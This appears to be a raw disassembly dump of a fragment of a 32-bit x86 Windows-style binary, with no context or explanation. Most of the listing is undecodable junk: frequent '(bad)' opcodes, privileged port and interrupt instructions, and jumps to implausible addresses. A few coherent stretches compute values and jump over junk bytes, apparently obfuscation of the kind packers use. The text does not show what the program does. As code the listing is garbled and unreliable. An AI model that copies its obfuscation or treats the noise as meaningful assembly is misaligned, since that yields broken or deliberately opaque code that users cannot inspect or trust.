  40a8a2:	jmp    0x6290a312
  40a8a7:	xor    bl,BYTE PTR [eax+esi*2+0x62f2d7c7]
  40a8ae:	fmul   DWORD PTR [ebx-0x24]
  40a8b1:	xor    edx,DWORD PTR [ecx-0x54]
  40a8b4:	sbb    ebp,ebp
  40a8b6:	fwait
  40a8b7:	notrack call DWORD PTR [edx+0x6eecb480]
  40a8be:	leave  
  40a8bf:	in     al,0x1c
  40a8c1:	pop    edi
  40a8c2:	or     bl,bl
  40a8c4:	mov    cl,0xa8
  40a8c6:	sub    DWORD PTR [ebx+ecx*1-0x62],edx
  40a8ca:	sbb    esi,DWORD PTR [ebp+eax*1-0x6f07fe09]
  40a8d1:	mov    BYTE PTR [esi-0xf],0x73
  40a8d5:	repz iret 
  40a8d7:	imul   esi,DWORD PTR [esi],0xffffffac
  40a8da:	in     eax,dx
  40a8db:	mov    ds:0x35e86dd6,eax
  40a8e0:	pushf  
  40a8e1:	mov    dh,0xb7
  40a8e3:	add    eax,0x95514736
  40a8e8:	mov    dh,0xd0
  40a8ea:	arpl   WORD PTR [esi],cx
  40a8ec:	cmp    ah,BYTE PTR [ecx+0x6f78cfb5]
  40a8f2:	sub    bh,BYTE PTR [ecx-0x48ef68e3]
  40a8f8:	iret   
  40a8f9:	das    
  40a8fa:	cwde   
  40a8fb:	mov    ebx,0x1d80c7ac
  40a900:	add    cl,BYTE PTR [ecx+eax*1]
  40a903:	imul   esi,edx,0x349fa10d
  40a909:	xchg   esi,eax
  40a90a:	and    al,0x35
  40a90c:	(bad)  
  40a90d:	cli    
  40a90e:	jnp    0x40a911
  40a910:	repnz pop edx
  40a912:	sbb    bh,BYTE PTR [esi+0x73]
  40a915:	sub    BYTE PTR [ecx-0x8],0x59
  40a919:	retf   0x48f6
  40a91c:	fs inc esi
  40a91e:	and    edx,DWORD PTR [edi+eax*4-0x74c77677]
  40a925:	inc    ebp
  40a926:	in     al,dx
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    ebx,edx
  40a948:	fxrstor [edx+ebx*8-0x7d]
  40a94d:	js     0x40a9c7
  40a94f:	je     0x40a9cf
  40a951:	js     0x40a9cb
  40a953:	xor    eax,0xa222a937
  40a958:	push   edi
  40a959:	cdq    
  40a95a:	push   0x5f9f444b
  40a95f:	(bad)  
  40a960:	mov    al,0xdd
  40a962:	test   al,0x6c
  40a964:	sahf   
  40a965:	stos   DWORD PTR es:[edi],eax
  40a966:	test   al,0x57
  40a968:	dec    edi
  40a969:	sub    edx,esi
  40a96b:	pusha  
  40a96c:	ret    0x19e5
  40a96f:	aam    0x67
  40a971:	ror    BYTE PTR [eax-0x7c],1
  40a974:	gs xchg esi,eax
  40a976:	sub    al,0x5
  40a978:	jl     0x40a9b1
  40a97a:	pop    es
  40a97b:	lahf   
  40a97c:	out    0x22,al
  40a97e:	(bad)  
  40a97f:	mov    esi,0xeb6ab543
  40a984:	out    0x90,eax
  40a986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a987:	mov    edx,DWORD PTR [esi-0x9]
  40a98a:	dec    eax
  40a98b:	sti    
  40a98c:	pop    eax
  40a98d:	out    dx,eax
  40a98e:	jge    0x40a983
  40a990:	jmp    0x6620bde1
  40a995:	(bad)  
  40a996:	xor    ecx,DWORD PTR ds:0x3359680c
  40a99c:	aam    0x6f
  40a99e:	push   ebp
  40a99f:	ds (bad) 
  40a9a2:	xchg   ebp,eax
  40a9a3:	sub    al,dl
  40a9a5:	mov    eax,0x69b8ab22
  40a9aa:	inc    edi
  40a9ab:	ss inc edi
  40a9ad:	push   esi
  40a9ae:	outs   dx,DWORD PTR ds:[esi]
  40a9af:	add    BYTE PTR [eax+0x58],0x42
  40a9b3:	cmp    BYTE PTR [edi-0x7eed3818],0xda
  40a9ba:	ret    0xd47a
  40a9bd:	lea    esp,[esi]
  40a9bf:	or     ch,BYTE PTR [esi]
  40a9c1:	rol    BYTE PTR [ebx],cl
  40a9c3:	cmp    esi,DWORD PTR [eax]
  40a9c5:	ficom  DWORD PTR [edx+eax*8]
  40a9c8:	and    BYTE PTR [edx],bl
  40a9ca:	outs   dx,DWORD PTR ds:[esi]
  40a9cb:	push   ebp
  40a9cc:	retf   
  40a9cd:	in     al,dx
  40a9ce:	add    al,0x60
  40a9d0:	mov    eax,ds:0x374d479a
  40a9d5:	xor    al,0xec
  40a9d7:	dec    ecx
  40a9d8:	fsub   DWORD PTR [esi+eiz*4]
  40a9db:	cmovae ebx,esp
  40a9de:	aas    
  40a9df:	ficomp DWORD PTR ss:[ebp-0x43]
  40a9e3:	shl    DWORD PTR [eax+0x20],1
  40a9e6:	xor    ebx,DWORD PTR [eax]
  40a9e8:	popa   
  40a9e9:	js     0x40aa2f
  40a9eb:	call   FWORD PTR [ecx+ebp*1+0x53]
  40a9ef:	adc    BYTE PTR [edi-0x79],dh
  40a9f2:	sub    eax,0x6c233dab
  40a9f7:	popf   
  40a9f8:	jns    0x40a99e
  40a9fa:	out    dx,al
  40a9fb:	xor    al,dh
  40a9fd:	xchg   ecx,eax
  40a9fe:	adc    BYTE PTR [edi+0x3ec9a81a],bl
  40aa04:	cwde   
  40aa05:	xchg   BYTE PTR [ebx+edi*2-0x15],al
  40aa09:	sbb    edi,DWORD PTR [edx-0x2f]
  40aa0c:	(bad)  
  40aa0d:	jge    0x40aa7c
  40aa0f:	or     ah,0xf2
  40aa12:	scas   al,BYTE PTR es:[edi]
  40aa13:	popa   
  40aa14:	sbb    eax,0x228f3c4e
  40aa19:	out    0x72,al
  40aa1b:	pop    es
  40aa1c:	movzx  esp,BYTE PTR [edi-0x39]
  40aa20:	imul   esp,DWORD PTR [edx+0x67],0xffffffc9
  40aa24:	sahf   
  40aa25:	outs   dx,DWORD PTR ds:[esi]
  40aa26:	call   0xdcca1ebd
  40aa2b:	les    esi,FWORD PTR [eax+0x4e2bcf9f]
  40aa31:	pop    ebp
  40aa32:	cmp    dh,BYTE PTR [edi]
  40aa34:	jmp    0x1d6120f5
  40aa39:	imul   edx,DWORD PTR [ecx],0xffffffe9
  40aa3c:	push   ebp
  40aa3d:	mov    eax,0x2a96603
  40aa43:	pop    ebx
  40aa44:	mov    BYTE PTR [ecx+0x2005a1ed],cl
  40aa4a:	jl     0x40aa11
  40aa4c:	repz in al,0x51
  40aa4f:	or     al,0xf9
  40aa51:	loope  0x40aaad
  40aa53:	ins    BYTE PTR es:[edi],dx
  40aa54:	daa    
  40aa55:	pop    ebp
  40aa56:	adc    bl,BYTE PTR [ecx+0x421f42db]
  40aa5c:	retf   0xefd3
  40aa5f:	adc    eax,DWORD PTR [edi-0x54060036]
  40aa65:	push   eax
  40aa66:	neg    BYTE PTR [ebp-0xc]
  40aa69:	adc    ebx,ecx
  40aa6b:	sahf   
  40aa6c:	stc    
  40aa6d:	lock sbb eax,0x6195c67d
  40aa73:	(bad)  [esi-0x16a2992d]
  40aa79:	cmp    al,0xb6
  40aa7b:	mov    bh,0xc0
  40aa7d:	jb     0x40aae8
  40aa7f:	push   ss
  40aa80:	lds    edi,FWORD PTR [edx+0x734d3f43]
  40aa86:	gs pop ebp
  40aa88:	imul   edi,DWORD PTR [edx],0x58
  40aa8b:	jno    0x40aa12
  40aa8d:	es out dx,eax
  40aa8f:	jmp    0xa7720781
  40aa94:	(bad)  
  40aa95:	cmp    BYTE PTR [ecx],ch
  40aa97:	(bad)  
  40aa98:	jge    0x40aa7c
  40aa9a:	xchg   ecx,eax
  40aa9b:	icebp  
  40aa9c:	lds    ebp,FWORD PTR [ecx+0x1b572ffd]
  40aaa2:	mov    bh,0xbf
  40aaa4:	dec    ebp
  40aaa5:	icebp  
  40aaa6:	dec    esp
  40aaa7:	or     DWORD PTR [edi+edx*4-0x75],edx
  40aaab:	test   BYTE PTR [edi],dh
  40aaad:	inc    esi
  40aaae:	lods   al,BYTE PTR ds:[esi]
  40aaaf:	xchg   edi,eax
  40aab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab1:	rcl    DWORD PTR [ebx+0x59],1
  40aab4:	jno    0x40ab0f
  40aab6:	ja     0x40aacd
  40aab8:	enterw 0x5866,0x27
  40aabd:	xchg   edi,eax
  40aabe:	push   cs
  40aabf:	fucom  st(6)
  40aac1:	popa   
  40aac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aac3:	dec    edi
  40aac4:	push   cs
  40aac5:	int3   
  40aac6:	mov    edx,0x4a64496c
  40aacb:	neg    DWORD PTR [ebp+0x684c74b2]
  40aad1:	pop    ecx
  40aad2:	jae    0x40aab4
  40aad4:	fstp   DWORD PTR [ebp+0x7a78300f]
  40aada:	repz mov esp,0x3cb628f8
  40aae0:	xchg   ecx,eax
  40aae1:	jmp    0x40aa84
  40aae3:	push   ss
  40aae4:	pop    eax
  40aae5:	js     0x40aada
  40aae7:	jb     0x40aa85
  40aae9:	int    0xe7
  40aaeb:	cmp    ecx,DWORD PTR [edx+0x6a]
  40aaee:	repz mov dh,0xc3
  40aaf1:	sbb    ah,BYTE PTR [ebx-0x3]
  40aaf4:	loop   0x40aa82
  40aaf6:	into   
  40aaf7:	cmp    al,0x4e
  40aaf9:	lahf   
  40aafa:	mov    esi,0x9d9b35dd
  40aaff:	mov    ah,0x84
  40ab01:	sahf   
  40ab02:	sbb    eax,0xb16ea81f
  40ab07:	inc    ebp
  40ab08:	inc    ebx
  40ab09:	jp     0x40aab1
  40ab0b:	xchg   edi,eax
  40ab0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab0d:	push   0xb168b95b
  40ab12:	sbb    eax,DWORD PTR [ecx]
  40ab14:	adc    BYTE PTR [ebp+eax*8-0x132c5f26],ch
  40ab1b:	and    al,0x2e
  40ab1d:	add    al,0x84
  40ab1f:	pushf  
  40ab20:	into   
  40ab21:	jle    0x40ab38
  40ab23:	xor    ebp,DWORD PTR [edi]
  40ab25:	mov    ds:0x8150fcbd,eax
  40ab2a:	pop    sp
  40ab2c:	icebp  
  40ab2d:	sar    ecx,cl
  40ab2f:	cmc    
  40ab30:	sahf   
  40ab31:	loopne 0x40ab8a
  40ab33:	xor    dh,BYTE PTR [edi-0x51abbb4b]
  40ab39:	into   
  40ab3a:	fisub  DWORD PTR [eax-0x3b]
  40ab3d:	addr16 ret 
  40ab3f:	inc    ebx
  40ab40:	inc    ebp
  40ab41:	pop    ecx
  40ab42:	xchg   edi,eax
  40ab43:	mov    WORD PTR [edi+0xc940b08],gs
  40ab49:	into   
  40ab4a:	push   edx
  40ab4b:	pop    edi
  40ab4c:	fld    TBYTE PTR [ebx-0x1d]
  40ab4f:	ret    0x7a
  40ab52:	popa   
  40ab53:	arpl   WORD PTR ds:[eax+0x1be18074],ax
  40ab5a:	cmp    al,0x61
  40ab5c:	stos   DWORD PTR es:[edi],eax
  40ab5d:	jno    0x40abce
  40ab5f:	sbb    al,0x8f
  40ab61:	(bad)  
  40ab62:	push   esp
  40ab63:	into   
  40ab64:	shr    ah,1
  40ab66:	pop    ds
  40ab67:	das    
  40ab68:	inc    ebx
  40ab69:	lods   al,BYTE PTR ds:[esi]
  40ab6a:	xor    eax,0x1565301f
  40ab6f:	ret    
  40ab70:	mov    edi,0x47e5934e
  40ab75:	jo     0x40ab7c
  40ab77:	jmp    FWORD PTR cs:[edx+0x4d]
  40ab7b:	jnp    0x40aba0
  40ab7d:	add    al,0x77
  40ab7f:	cmp    ecx,DWORD PTR [eax+0x1a]
  40ab82:	loop   0x40abe1
  40ab84:	clc    
  40ab85:	addr16 into 
  40ab87:	sbb    al,0xb4
  40ab89:	stos   DWORD PTR es:[edi],eax
  40ab8a:	dec    ebp
  40ab8b:	push   eax
  40ab8c:	or     eax,0x4b17df75
  40ab91:	mov    al,BYTE PTR [ecx]
  40ab93:	(bad)  
  40ab94:	outs   dx,BYTE PTR ds:[esi]
  40ab95:	mov    ebx,es
  40ab97:	or     BYTE PTR [esi],al
  40ab99:	mov    ebp,0xcd84b6ac
  40ab9e:	cwde   
  40ab9f:	lahf   
  40aba0:	lods   al,BYTE PTR ds:[si]
  40aba2:	adc    DWORD PTR [ecx+0x57],0x227746bd
  40aba9:	adc    al,0xb5
  40abab:	stos   DWORD PTR es:[edi],eax
  40abac:	or     DWORD PTR [ebp+0x3f],ebp
  40abaf:	dec    esi
  40abb0:	add    eax,edi
  40abb2:	frstor [esi]
  40abb4:	or     ah,al
  40abb6:	fwait
  40abb7:	inc    ebp
  40abb8:	pop    ds
  40abb9:	js     0x40ac18
  40abbb:	xchg   esp,eax
  40abbc:	ja     0x40ab6f
  40abbe:	and    edx,DWORD PTR [esi+0x3b]
  40abc1:	mov    ah,0x77
  40abc3:	mov    ds:0x3d07deb8,eax
  40abc8:	mov    esi,0x53a3643c
  40abcd:	jg     0x40ac26
  40abcf:	sbb    BYTE PTR [ecx+0x3a73f889],cl
  40abd5:	or     al,0x48
  40abd7:	ret    
  40abd8:	adc    BYTE PTR [eax+0x4a82315c],dl
  40abde:	mov    ebx,0x7c7c315e
  40abe3:	sahf   
  40abe4:	out    0x9e,eax
  40abe6:	add    al,0x1
  40abe8:	frstpm(287 only) 
  40abea:	and    eax,ebx
  40abec:	into   
  40abed:	mov    bl,0x37
  40abef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abf0:	mov    dl,0x83
  40abf2:	cmp    DWORD PTR [ebp-0x80],ebx
  40abf5:	push   cs
  40abf6:	sub    dl,bh
  40abf8:	jns    0x40ac12
  40abfa:	xchg   edi,eax
  40abfb:	lahf   
  40abfc:	push   edx
  40abfd:	jl     0x40ac27
  40abff:	test   BYTE PTR [esi],ch
  40ac01:	pop    esi
  40ac02:	sub    ah,BYTE PTR [ecx+0x48f4118e]
  40ac08:	or     bl,cl
  40ac0a:	stc    
  40ac0b:	xchg   esp,eax
  40ac0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac0d:	fsub   QWORD PTR ds:0x28cf6643
  40ac13:	les    ecx,FWORD PTR [esi+0x10374a0a]
  40ac19:	outs   dx,DWORD PTR ds:[esi]
  40ac1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac1c:	outs   dx,BYTE PTR ds:[esi]
  40ac1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac1e:	repz mov bl,0x5
  40ac21:	mov    bl,0x2b
  40ac23:	push   ebx
  40ac24:	sbb    DWORD PTR [esi],ebx
  40ac26:	ins    BYTE PTR es:[edi],dx
  40ac27:	sbb    ebp,esi
  40ac29:	pushf  
  40ac2a:	dec    ebp
  40ac2b:	lods   eax,DWORD PTR ds:[esi]
  40ac2c:	call   0xda97:0x77229677
  40ac33:	mov    ds:0x2e5d72f7,al
  40ac38:	xlat   BYTE PTR ds:[ebx]
  40ac39:	fs test eax,0x5bae3421
  40ac3f:	cmp    DWORD PTR [ebx+0x2d],edx
  40ac42:	ds mov edi,0x5ba3c6e1
  40ac48:	imul   eax,DWORD PTR [edx],0x71be1a77
  40ac4e:	hlt    
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	emms   
  40ac8d:	mov    al,BYTE PTR [esi+0x7880d6e2]
  40ac93:	js     0x40ad09
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac20
  40ac99:	push   cs
  40ac9a:	cmp    bl,BYTE PTR [ebx-0x37]
  40ac9d:	pop    ebp
  40ac9e:	adc    al,0x64
  40aca0:	jge    0x40ac63
  40aca2:	add    DWORD PTR ds:0x7cc6311,0x2a
  40aca9:	cdq    
  40acaa:	mov    edx,0x87d8993b
  40acaf:	repnz and DWORD PTR [ebx],0x1df6904f
  40acb6:	popa   
  40acb7:	mov    dl,0x53
  40acb9:	fldcw  WORD PTR [edi]
  40acbb:	call   0xfd6b23c3
  40acc0:	ror    BYTE PTR [ebx-0x3f],0x57
  40acc4:	mov    dh,0xe0
  40acc6:	and    eax,DWORD PTR [ebx]
  40acc8:	jl     0x40ad32
  40acca:	faddp  st(1),st
  40accc:	or     dh,BYTE PTR [edi]
  40acce:	push   edi
  40accf:	mov    bl,BYTE PTR [edx-0x73]
  40acd2:	cmp    esp,ecx
  40acd4:	das    
  40acd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd6:	mov    ds:0xdeb19031,eax
  40acdb:	mov    DWORD PTR [ebp-0x80],ebp
  40acde:	outs   dx,BYTE PTR ds:[esi]
  40acdf:	cli    
  40ace0:	push   ds
  40ace1:	mov    ebp,0x644c08b1
  40ace6:	je     0x40ace6
  40ace8:	lods   eax,DWORD PTR ds:[esi]
  40ace9:	repnz pushf 
  40aceb:	cmp    eax,0xd789d727
  40acf0:	dec    ecx
  40acf1:	fstp   DWORD PTR [edx+0x283ea39d]
  40acf7:	cmp    DWORD PTR [eax+0x71b277],edi
  40acfd:	test   BYTE PTR [ecx-0x24],0x95
  40ad01:	push   cs
  40ad02:	or     ah,BYTE PTR [ebx]
  40ad04:	ins    BYTE PTR es:[edi],dx
  40ad05:	lea    esp,[ebx+0x3605cae3]
  40ad0b:	push   ecx
  40ad0c:	jb     0x40acfd
  40ad0e:	cmc    
  40ad0f:	scas   eax,DWORD PTR es:[edi]
  40ad10:	inc    ebp
  40ad11:	js     0x40ad7a
  40ad13:	cmp    eax,0xc4296fe6
  40ad18:	je     0x40ad29
  40ad1a:	in     al,dx
  40ad1b:	retf   0xf92b
  40ad1e:	push   0x47
  40ad20:	mov    ebp,0xcd41ca3b
  40ad25:	mov    al,0x79
  40ad27:	and    al,0xa
  40ad29:	push   eax
  40ad2a:	int3   
  40ad2b:	jb     0x40ad4e
  40ad2d:	sbb    eax,0xf5c4a1b7
  40ad32:	xchg   edx,eax
  40ad33:	pusha  
  40ad34:	push   0xffffffe5
  40ad36:	adc    BYTE PTR [edi+eiz*4-0x77],0x73
  40ad3b:	out    0x46,eax
  40ad3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad3e:	outs   dx,BYTE PTR ds:[esi]
  40ad3f:	scas   eax,DWORD PTR es:[edi]
  40ad40:	icebp  
  40ad41:	cs mov ch,0x57
  40ad44:	xor    edx,DWORD PTR ss:[ebx]
  40ad47:	sti    
  40ad48:	add    DWORD PTR ds:0xde0e2091,edx
  40ad4e:	(bad)  [eax+0x2b]
  40ad51:	mov    ah,0x7f
  40ad53:	inc    edx
  40ad54:	(bad)  
  40ad55:	sti    
  40ad56:	xor    eax,0x679a6748
  40ad5b:	mov    ds:0xedd5f7f5,al
  40ad60:	push   0x76
  40ad62:	xor    eax,0xaa917d57
  40ad67:	aam    0xa0
  40ad69:	mov    bh,0x28
  40ad6b:	add    al,0xee
  40ad6d:	mov    WORD PTR [ebx-0x7a4d52f4],?
  40ad73:	shr    DWORD PTR [edx+0x53],0x84
  40ad77:	inc    ebp
  40ad78:	jmp    0x40ad39
  40ad7a:	cmp    eax,0x2143f1b9
  40ad7f:	add    DWORD PTR [edx],ecx
  40ad81:	cli    
  40ad82:	(bad)  
  40ad83:	cdq    
  40ad84:	dec    edi
  40ad85:	(bad)  
  40ad86:	jl     0x40adfe
  40ad88:	mov    fs,eax
  40ad8a:	cmp    DWORD PTR [eax-0x3716e45a],esp
  40ad90:	mov    ecx,0x5d1babe
  40ad95:	and    bl,BYTE PTR [esi]
  40ad97:	xchg   ecx,eax
  40ad98:	out    0x67,eax
  40ad9a:	xchg   ebx,eax
  40ad9b:	mov    bl,0x24
  40ad9d:	fwait
  40ad9e:	sub    DWORD PTR [edx-0x67],0x6e
  40ada2:	aas    
  40ada3:	mov    ecx,0x7c854158
  40ada8:	cmp    ch,al
  40adaa:	xchg   ebp,eax
  40adab:	and    esi,0xb74c5646
  40adb1:	cmp    al,0x39
  40adb3:	scas   eax,DWORD PTR es:[edi]
  40adb4:	xchg   ebx,eax
  40adb5:	or     al,0xac
  40adb7:	loope  0x40ad9c
  40adb9:	xchg   ebx,eax
  40adba:	pop    edi
  40adbb:	sahf   
  40adbc:	adc    ah,BYTE PTR [esi-0x51]
  40adbf:	jmp    0x1c5b2a56
  40adc4:	dec    edi
  40adc5:	enter  0x21c6,0x2b
  40adc9:	push   edi
  40adca:	je     0x40adb7
  40adcc:	push   ds
  40adcd:	repnz stos DWORD PTR es:[edi],eax
  40adcf:	stos   DWORD PTR es:[edi],eax
  40add0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40add1:	mov    es,ecx
  40add3:	fidivr WORD PTR [eax+esi*2]
  40add6:	mov    cl,dh
  40add8:	adc    eax,0x3f6d4c13
  40addd:	jne    0x40adf6
  40addf:	aad    0x88
  40ade1:	add    BYTE PTR [esi-0x69b3fc22],dh
  40ade7:	in     al,dx
  40ade8:	push   edi
  40ade9:	iret   
  40adea:	cmp    al,0x65
  40adec:	test   eax,0x57a10d7
  40adf1:	pop    ecx
  40adf2:	daa    
  40adf3:	les    esp,FWORD PTR [ebx-0x7fbf52d2]
  40adf9:	push   cs
  40adfa:	cld    
  40adfb:	out    0xb1,eax
  40adfd:	aas    
  40adfe:	repnz (bad) 
  40ae00:	bnd jmp 0x40adaa
  40ae03:	push   es
  40ae04:	cmp    ebx,ecx
  40ae06:	sub    esi,DWORD PTR [edi+0x23008ea6]
  40ae0c:	stos   DWORD PTR es:[edi],eax
  40ae0d:	icebp  
  40ae0e:	mov    esp,DWORD PTR [edi-0x67]
  40ae11:	dec    ecx
  40ae12:	sub    al,0x7d
  40ae14:	xchg   ebp,eax
  40ae15:	int    0x8b
  40ae17:	mov    DWORD PTR [ecx-0x10],eax
  40ae1a:	ins    BYTE PTR es:[edi],dx
  40ae1b:	lods   al,BYTE PTR gs:[esi]
  40ae1d:	xor    cl,BYTE PTR [esi-0x67375167]
  40ae23:	cdq    
  40ae24:	nop
  40ae25:	outs   dx,BYTE PTR ds:[esi]
  40ae26:	lahf   
  40ae27:	cmp    dh,cl
  40ae29:	push   esi
  40ae2a:	les    eax,FWORD PTR [ebx]
  40ae2c:	xchg   DWORD PTR [edx-0x68],esp
  40ae2f:	dec    ebx
  40ae30:	enter  0x1fb0,0x51
  40ae34:	stc    
  40ae35:	cmc    
  40ae36:	push   esp
  40ae37:	addr16 jae 0x40aea8
  40ae3a:	fcomp  QWORD PTR [ebx-0x58446caf]
  40ae40:	inc    edx
  40ae41:	or     eax,0x1c612100
  40ae46:	dec    esi
  40ae47:	ss jne 0x40ae2d
  40ae4a:	dec    edi
  40ae4b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40ae4d:	mov    bp,0xc82c
  40ae51:	dec    ecx
  40ae52:	xchg   esi,eax
  40ae53:	call   0x89f0926e
  40ae58:	or     DWORD PTR [ebp+edi*8+0x34],ebx
  40ae5c:	pop    ebx
  40ae5d:	cwde   
  40ae5e:	ds cmp bl,cl
  40ae61:	ds push cs
  40ae63:	popf   
  40ae64:	call   0xd1d5b33d
  40ae69:	push   0x28
  40ae6b:	mov    cl,0x7a
  40ae6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae6e:	bound  eax,QWORD PTR [eax]
  40ae70:	mov    ds:0x7d6eb2fd,eax
  40ae75:	mov    ah,0x37
  40ae77:	xor    ebx,DWORD PTR [eax]
  40ae79:	jg     0x40ae44
  40ae7b:	popa   
  40ae7c:	out    dx,al
  40ae7d:	mov    esi,0x2f7a07e7
  40ae82:	sub    DWORD PTR [ebx-0x58],edx
  40ae85:	dec    edx
  40ae86:	mov    bh,0x30
  40ae88:	arpl   bp,dx
  40ae8a:	stc    
  40ae8b:	inc    edi
  40ae8c:	and    eax,0x2cc00be5
  40ae91:	xor    BYTE PTR [edx+0x4e05ca4],bl
  40ae97:	jp     0x40ae41
  40ae99:	dec    edx
  40ae9a:	enter  0xe7f6,0x8e
  40ae9e:	cmp    al,bh
  40aea0:	je     0x40af18
  40aea2:	(bad)  
  40aea3:	dec    edi
  40aea4:	mov    ch,0xf3
  40aea6:	(bad)  
  40aea7:	or     dh,BYTE PTR [ebx+0x6a20c2f7]
  40aead:	xor    eax,0x65b6963f
  40aeb2:	xchg   esi,eax
  40aeb3:	test   al,0x93
  40aeb5:	push   edi
  40aeb6:	cdq    
  40aeb7:	pusha  
  40aeb8:	inc    esi
  40aeb9:	xlat   BYTE PTR ds:[ebx]
  40aeba:	popa   
  40aebb:	in     eax,dx
  40aebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebd:	retf   0xc793
  40aec0:	push   es
  40aec1:	pushf  
  40aec2:	inc    BYTE PTR [esi]
  40aec4:	push   ecx
  40aec5:	inc    esp
  40aec6:	loope  0x40aef1
  40aec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec9:	lds    eax,FWORD PTR [esi+0xa]
  40aecc:	jo     0x40af03
  40aece:	dec    edx
  40aecf:	retf   
  40aed0:	cmp    eax,0x82ed550f
  40aed5:	clc    
  40aed6:	ret    
  40aed7:	leave  
  40aed8:	sbb    DWORD PTR [ecx],ecx
  40aeda:	xor    eax,0xa4f35a4
  40aedf:	sbb    ch,BYTE PTR [esi]
  40aee1:	mov    cl,0x23
  40aee3:	push   0xffffff80
  40aee5:	mov    dh,0x68
  40aee7:	or     BYTE PTR ds:0x555e3d22,bl
  40aeed:	inc    ebx
  40aeee:	mov    ds:0xb2ff743a,al
  40aef3:	(bad)  
  40aef4:	out    dx,al
  40aef5:	out    dx,al
  40aef6:	ins    BYTE PTR es:[edi],dx
  40aef7:	sbb    ebp,esi
  40aef9:	pop    ecx
  40aefa:	cli    
  40aefb:	xchg   ebx,eax
  40aefc:	pop    ds
  40aefd:	adc    ah,BYTE PTR [ecx+0x7e7e2427]
  40af03:	je     0x40aeb8
  40af05:	pop    es
  40af06:	pop    esp
  40af07:	add    eax,0xefde6ee5
  40af0c:	outs   dx,BYTE PTR ss:[esi]
  40af0e:	and    BYTE PTR [eax],ah
  40af10:	lock inc esi
  40af12:	mov    dl,0x9d
  40af14:	stc    
  40af15:	lahf   
  40af16:	or     ebx,edx
  40af18:	xor    DWORD PTR [esi+0x5bd3cfd8],esi
  40af1e:	fadd   st(1),st
  40af20:	sub    DWORD PTR [ebx+ebx*8],edx
  40af23:	mov    eax,ds:0x7b956ca8
  40af28:	jp     0x40af66
  40af2a:	lock idiv BYTE PTR [edx-0x44]
  40af2e:	push   ss
  40af2f:	retf   
  40af30:	xlat   BYTE PTR ds:[ebx]
  40af31:	inc    esi
  40af32:	xor    eax,0xdd671f68
  40af37:	pop    ss
  40af38:	cli    
  40af39:	lds    esi,FWORD PTR [edi+0x8]
  40af3c:	mov    dl,0x8c
  40af3e:	inc    ecx
  40af3f:	stos   BYTE PTR es:[edi],al
  40af40:	dec    esp
  40af41:	cmpxchg8b QWORD PTR cs:[ecx]
  40af45:	dec    ecx
  40af46:	fsqrt  
  40af48:	push   ecx
  40af49:	pop    edi
  40af4a:	cmp    ebp,DWORD PTR [ecx-0x513ba919]
  40af50:	jg     0x40aeeb
  40af52:	ror    BYTE PTR [ecx],1
  40af54:	ins    DWORD PTR es:[edi],dx
  40af55:	in     al,dx
  40af56:	mov    ebx,0xfe6feb07
  40af5b:	test   ebp,ebp
  40af5d:	jle    0x40af35
  40af5f:	in     eax,0x52
  40af61:	fs sbb bl,dh
  40af64:	aaa    
  40af65:	aad    0x6e
  40af67:	cmp    eax,0x4d7c5fc9
  40af6c:	fimul  DWORD PTR [esi+0x7e]
  40af6f:	arpl   WORD PTR [eax+0x68],cx
  40af72:	cmp    DWORD PTR [ebp*2-0x78d32a2c],edi
  40af79:	sub    BYTE PTR [ecx],dh
  40af7b:	xor    esi,ecx
  40af7d:	pushf  
  40af7e:	mov    eax,ds:0x86490c4c
  40af83:	ficomp DWORD PTR [edi+0x23]
  40af86:	pop    ebp
  40af87:	xchg   esp,eax
  40af88:	dec    eax
  40af89:	jae    0x40afb3
  40af8b:	pop    ds
  40af8c:	ins    BYTE PTR es:[edi],dx
  40af8d:	mov    cl,0x80
  40af8f:	call   0x108b:0xc49ff3
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
